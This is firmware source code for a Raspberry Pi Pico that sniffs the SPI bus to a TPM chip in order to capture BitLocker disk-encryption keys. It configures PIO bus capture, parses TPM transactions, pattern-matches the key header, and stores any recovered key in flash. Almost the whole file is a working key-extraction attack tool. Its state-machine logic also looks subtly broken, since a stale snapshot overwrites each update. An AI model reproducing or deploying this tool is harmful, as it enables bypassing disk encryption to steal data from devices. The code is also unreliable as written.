#include <stdio.h>
#include <cstring>
#include "pico/stdlib.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"
#include "hardware/gpio.h"
#include "hardware/flash.h"
#include "hardware/sync.h"
#include "hardware/irq.h"
#include "flash_storage.h"
#include "spi_sniffer.pio.h"

// --- Hardware Configuration ---
#define PIN_SPI0_CS   0
#define PIN_SPI0_SCK  1
#define PIN_SPI0_MOSI 2
#define PIN_SPI0_MISO 3

// --- Protocol Constants ---
#define TPM_BITLOCKER_ADDR 0x00D40024
#define KEY_PATTERN_LEN 44
#define KEY_DATA_LEN 32
#define MAX_TRANSACTION_SIZE 64

// --- State Machine Enums ---
typedef enum {
    STATE_IDLE = 0,
    STATE_ADDR,
    STATE_WAIT_READY,
    STATE_DATA
} sniff_state_t;

// --- Atomic State Machine (all state in one struct) ---
typedef struct {
    sniff_state_t state;
    uint8_t addr_bytes;
    uint32_t address;
    uint8_t xfer_size;
    uint8_t data_count;
    bool is_read_op;
    bool key_found;
} __attribute__((packed)) machine_state_t;

// --- Command Buffer ---
#define CMD_BUFFER_SIZE 64
static char cmd_buffer[CMD_BUFFER_SIZE];
static int cmd_pos = 0;

// --- Buffers ---
static uint8_t data_buffer[MAX_TRANSACTION_SIZE];
static uint8_t window[KEY_PATTERN_LEN];
static int win_len = 0;

// --- Statistics ---
static _Atomic uint32_t transactions_processed = 0;
static _Atomic uint32_t keys_found = 0;

// --- Live Stream Buffer ---
#define STREAM_BUFFER_SIZE 512
static volatile uint16_t stream_buffer[STREAM_BUFFER_SIZE];
static _Atomic int stream_head = 0;
static _Atomic int stream_tail = 0;
static _Atomic bool stream_active = 0;

// --- Key Pending Buffer ---
static _Atomic(bool) key_save_pending = false;
static uint8_t pending_key[KEY_DATA_LEN];

// --- PIO Handles ---
static PIO pio_handle;
static uint sm_mosi_handle;
static uint sm_miso_handle;

// --- Function Prototypes ---
void processSPIByte(uint8_t mosi, uint8_t miso);
bool checkAndStoreKey(uint8_t* buffer, int len);
void processCommand(const char* cmd);

// --- Stream Helper Functions ---
static inline bool is_stream_empty(void) {
    return atomic_load(&stream_head) == atomic_load(&stream_tail);
}

static inline bool is_stream_full(void) {
    int next_head = (atomic_load(&stream_head) + 1) % STREAM_BUFFER_SIZE;
    return next_head == atomic_load(&stream_tail);
}

static inline void stream_push(uint16_t entry) {
    int head = atomic_load(&stream_head);
    int new_head = (head + 1) % STREAM_BUFFER_SIZE;

    if (new_head == atomic_load(&stream_tail)) {
        return; // Drop if full
    }

    stream_buffer[head] = entry;
    atomic_store(&stream_head, new_head);
}

static inline uint16_t stream_pop(void) {
    int tail = atomic_load(&stream_tail);

    if (tail == atomic_load(&stream_head)) {
        return 0xFFFF;
    }

    uint16_t entry = stream_buffer[tail];
    atomic_store(&stream_tail, (tail + 1) % STREAM_BUFFER_SIZE);
    return entry;
}

// --- Critical Section State Machine Access ---
static machine_state_t machine_state = {0};

static inline void machine_transition(sniff_state_t new_state) {
    uint32_t ints = save_and_disable_interrupts();
    machine_state.state = new_state;
    restore_interrupts(ints);
}

int main() {
    stdio_init_all();
    setbuf(stdout, NULL);

    printf("\n=== BitLocker TPM Sniffer ===\n");

    uint8_t boot_key[KEY_DATA_LEN];
    if (flash_retrieve_key(boot_key)) {
        printf("\n[!!!] STORED KEY DETECTED AT BOOT\n");
    }

    // --- PIO Initialization ---
    PIO pio = pio0;
    uint sm_mosi = 0;
    uint sm_miso = 1;

    pio_handle = pio;
    sm_mosi_handle = sm_mosi;
    sm_miso_handle = sm_miso;

    uint offset = pio_add_program(pio, &spi_sniffer_program);

    auto setup_pio_sm = [&](uint sm, uint data_pin, uint cs_pin, uint sck_pin) {
        pio_sm_config c = spi_sniffer_program_get_default_config(offset);
        sm_config_set_in_pins(&c, data_pin);
        sm_config_set_in_shift(&c, true, false, 8);
        gpio_set_function(cs_pin, GPIO_FUNC_PIO0);
        gpio_set_input_enabled(cs_pin, true);
        gpio_set_pulls(cs_pin, true, false);
        gpio_set_function(sck_pin, GPIO_FUNC_PIO0);
        gpio_set_input_enabled(sck_pin, true);
        gpio_set_function(data_pin, GPIO_FUNC_PIO0);
        gpio_set_input_enabled(data_pin, true);
        sm_config_set_jmp_pin(&c, cs_pin);
        pio_sm_init(pio, sm, offset, &c);
        pio_sm_set_enabled(pio, sm, true);
    };

    setup_pio_sm(sm_mosi, PIN_SPI0_MOSI, PIN_SPI0_CS, PIN_SPI0_SCK);
    setup_pio_sm(sm_miso, PIN_SPI0_MISO, PIN_SPI0_CS, PIN_SPI0_SCK);

    // --- Main Loop ---
    while (true) {
        // 1. Process Serial Input
        int c = getchar_timeout_us(0);
        if (c != PICO_ERROR_TIMEOUT) {
            if (c == '\r' || c == '\n') {
                cmd_buffer[cmd_pos] = '\0';
                processCommand(cmd_buffer);
                cmd_pos = 0;
            } else if (cmd_pos < CMD_BUFFER_SIZE - 1) {
                cmd_buffer[cmd_pos++] = c;
            }
        }

        // 2. Process PIO Data (with robust sync)
        bool mosi_ready = !pio_sm_is_rx_fifo_empty(pio, sm_mosi);
        bool miso_ready = !pio_sm_is_rx_fifo_empty(pio, sm_miso);

        // Only process when BOTH FIFOs have data
        if (mosi_ready && miso_ready) {
            uint32_t ints = save_and_disable_interrupts();
            uint32_t raw_mosi = pio_sm_get(pio, sm_mosi);
            uint32_t raw_miso = pio_sm_get(pio, sm_miso);
            restore_interrupts(ints);

            uint8_t mosi_byte = (uint8_t)(raw_mosi >> 24);
            uint8_t miso_byte = (uint8_t)(raw_miso >> 24);

            processSPIByte(mosi_byte, miso_byte);
        }

        // 3. Drain Stream Buffer
        if (atomic_load(&stream_active) && !is_stream_empty()) {
            printf("DATA: ");
            int batch_count = 0;

            while (!is_stream_empty() && batch_count < 16) {
                uint16_t entry = stream_pop();
                if (entry == 0xFFFF) break;

                uint8_t val = entry & 0xFF;
                bool is_read = (entry & 0x8000) != 0;
                printf("[%c]%02X ", is_read ? 'R' : 'W', val);
                batch_count++;
            }
            printf("\n");
        }

        // 4. Process Pending Key (with memory barrier)
        if (atomic_load(&key_save_pending)) {
            __atomic_thread_fence(__ATOMIC_ACQUIRE);
            uint8_t local_key[KEY_DATA_LEN];

            // Copy with interrupts disabled for safety
            uint32_t ints = save_and_disable_interrupts();
            memcpy(local_key, pending_key, KEY_DATA_LEN);
            atomic_store(&key_save_pending, false);
            restore_interrupts(ints);

            // Execute from RAM
            flash_store_key(local_key);

            atomic_fetch_add(&keys_found, 1);
            printf("\n[[[ !!! KEY FOUND AND STORED !!! ]]]\n");
        }
    }

    return 0;
}

void processSPIByte(uint8_t mosi, uint8_t miso) {
    uint32_t ints = save_and_disable_interrupts();
    machine_state_t state = machine_state; // Snapshot
    restore_interrupts(ints);

    switch(state.state) {
        case STATE_IDLE:
            machine_state.is_read_op = (mosi & 0x80) != 0;
            machine_state.xfer_size = (mosi & 0x3F) + 1;
            machine_state.address = 0;
            machine_state.addr_bytes = 0;
            machine_state.data_count = 0;
            machine_state.key_found = false;
            machine_transition(STATE_ADDR);
            break;

        case STATE_ADDR: {
            machine_state.address = (machine_state.address << 8) | mosi;
            machine_state.addr_bytes++;

            if (machine_state.addr_bytes >= 3) {
                machine_transition((miso & 0x01) == 0 ? STATE_WAIT_READY : STATE_DATA);
            }
            break;
        }

        case STATE_WAIT_READY:
            if (miso == 0x01) {
                machine_transition(STATE_DATA);
            }
            break;

        case STATE_DATA: {
            // Bounds check to prevent overflow
            if (machine_state.data_count >= MAX_TRANSACTION_SIZE) {
                machine_transition(STATE_IDLE);
                break;
            }

            uint8_t data_byte = machine_state.is_read_op ? miso : mosi;
            data_buffer[machine_state.data_count] = data_byte;
            machine_state.data_count++;

            // Stream push (non-blocking)
            if (atomic_load(&stream_active)) {
                stream_push(data_byte | (machine_state.is_read_op ? 0x8000 : 0x0000));
            }

            if (machine_state.data_count >= machine_state.xfer_size) {
                atomic_fetch_add(&transactions_processed, 1);

                if (machine_state.address == TPM_BITLOCKER_ADDR) {
                    if (checkAndStoreKey(data_buffer, machine_state.data_count)) {
                        machine_state.key_found = true;
                    }
                }
                machine_transition(STATE_IDLE);
            }
            break;
        }
    }

    // Write back atomically
    ints = save_and_disable_interrupts();
    machine_state = state;
    restore_interrupts(ints);
}

bool checkAndStoreKey(uint8_t* buffer, int len) {
    // Safety: prevent buffer overruns
    if (len <= 0 || len > MAX_TRANSACTION_SIZE) return false;

    if (len > KEY_PATTERN_LEN) {
        int skip = len - KEY_PATTERN_LEN;
        buffer += skip;
        len = KEY_PATTERN_LEN;
    }

    // Update sliding window
    int space_available = KEY_PATTERN_LEN - win_len;
    int copy_len = (len < space_available) ? len : space_available;

    memcpy(window + win_len, buffer, copy_len);
    win_len += copy_len;

    // Slide window if full
    if (win_len > KEY_PATTERN_LEN) {
        int excess = win_len - KEY_PATTERN_LEN;
        memmove(window, window + excess, KEY_PATTERN_LEN - excess);
        win_len = KEY_PATTERN_LEN;
    }

    // Pattern matching (TPM BitLocker key header)
    if (win_len < KEY_PATTERN_LEN) return false;

    for (int i = 0; i <= win_len - KEY_PATTERN_LEN; i++) {
        if (window[i] == 0x2C &&
            window[i+1] == 0x00 &&
            window[i+2] <= 0x06 &&
            window[i+3] == 0x00 &&
            window[i+4] >= 0x01 && window[i+4] <= 0x09 &&
            window[i+5] == 0x00 &&
            window[i+6] <= 0x01 &&
            window[i+7] == 0x00 &&
            window[i+8] <= 0x05 &&
            window[i+9] == 0x20 &&
            window[i+10] == 0x00 &&
            window[i+11] == 0x00) {

            // Copy key with memory barrier
            memcpy(pending_key, &window[i + 12], KEY_DATA_LEN);
            __atomic_thread_fence(__ATOMIC_RELEASE);
            atomic_store(&key_save_pending, true);

            win_len = 0;
            return true;
        }
    }

    return false;
}

void processCommand(const char* cmd) {
    if (strcmp(cmd, "status") == 0) {
        printf("Transactions: %lu\n", atomic_load(&transactions_processed));
        printf("Keys Found: %lu\n", atomic_load(&keys_found));
    } else if (strcmp(cmd, "stream on") == 0) {
        atomic_store(&stream_active, true);
        printf("Streaming enabled\n");
    } else if (strcmp(cmd, "stream off") == 0) {
        atomic_store(&stream_active, false);
        printf("Streaming disabled\n");
    } else if (strcmp(cmd, "clear") == 0) {
        atomic_store(&transactions_processed, 0);
        atomic_store(&keys_found, 0);
        win_len = 0;
        printf("Statistics cleared\n");
    } else if (strcmp(cmd, "reset") == 0) {
        machine_transition(STATE_IDLE);
        win_len = 0;
        printf("State machine reset\n");
    } else {
        printf("Unknown command: %s\n", cmd);
    }
}
